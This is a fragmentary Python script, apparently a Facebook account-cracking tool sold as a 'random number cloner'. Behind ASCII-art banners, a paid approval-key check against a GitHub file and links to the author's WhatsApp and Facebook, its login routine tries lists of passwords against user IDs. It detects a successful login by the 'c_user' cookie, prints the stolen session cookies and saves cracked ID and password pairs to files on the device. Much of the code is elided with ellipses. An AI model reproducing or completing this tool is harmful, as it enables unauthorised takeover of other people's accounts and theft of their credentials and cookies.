...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By H^Z")
...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://raw.githubusercontent.com/H^Z1×100/game.py/main/game.txt').text
...
__/\\\________/\\\______________________/\\\\\\\\\\\\____________/\\\___/\\\________/\\\_        
 _\/\\\_______\/\\\_____________________\/\\\////////\\\_________\/\\\__\/\\\_______\/\\\_       
  _\/\\\_______\/\\\________________/\\\_\/\\\______\//\\\________\/\\\__\/\\\_______\/\\\_      
   _\/\\\\\\\\\\\\\\\__/\\/\\\\\\\__\///__\/\\\_______\/\\\________\/\\\__\/\\\_______\/\\\_     
    _\/\\\/////////\\\_\/\\\/////\\\__/\\\_\/\\\_______\/\\\___/\\\\\\\\\__\/\\\_______\/\\\_    
     _\/\\\_______\/\\\_\/\\\___\///__\/\\\_\/\\\_______\/\\\__/\\\////\\\__\/\\\_______\/\\\_   
      _\/\\\_______\/\\\_\/\\\_________\/\\\_\/\\\_______/\\\__\/\\\__\/\\\__\//\\\______/\\\__  
       _\/\\\_______\/\\\_\/\\\_________\/\\\_\/\\\\\\\\\\\\/___\//\\\\\\\/\\__\///\\\\\\\\\/___ 
        _\///________\///__\///__________\///__\////////////______\///////\//_____\/////////_____

    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : BoSs__HriDdU            │
    │ [✓] GITHUB   : secret ace pore zibo                │
    │ [✓] WHATSAPP : +01608426376         │
    │ [✓] VERSION  : H^Z MiX                   │
    │ [✓] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37m│
    └───────────────────────────────────────┘""")
  print(f"\t \033[1;32m NAMTA MONE RAKHBEN H^Z_HriDdu\033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  hridoy SIR TOOLS ER PRICE CHILO 6K TK  \033[1;37m ")
  print(f"")
  ...
  os.system(f'xdg-open https://www.facebook.com/profile.php?id=100086471130404')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/MR-H^Z1×1/approved99/blob/main/Testapproval.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://wa.me/+01608426376?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
 ...
 _\/\\\_______\/\\\_____________________\/\\\////////\\\_________\/\\\__\/\\\_______\/\\\_       
  _\/\\\_______\/\\\________________/\\\_\/\\\______\//\\\________\/\\\__\/\\\_______\/\\\_      
   _\/\\\\\\\\\\\\\\\__/\\/\\\\\\\__\///__\/\\\_______\/\\\________\/\\\__\/\\\_______\/\\\_     
    ...
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : BoSs__HriDdU            │
    │ [✓] GITHUB   : secret ace pore dibo                │
    │ [✓] WHATSAPP : +8801608426376         │
    │ [✓] VERSION  : Z^H   MaX                │
    │ [✓] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37m│
    └───────────────────────────────────────┘""")
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+01608426376');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100086471130404');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://youtube.com/@reactor2961');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mH^Z1×1\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [H^Z-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                open('/sdcard/H^Z-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/H^Z1×1-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/H^Z-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
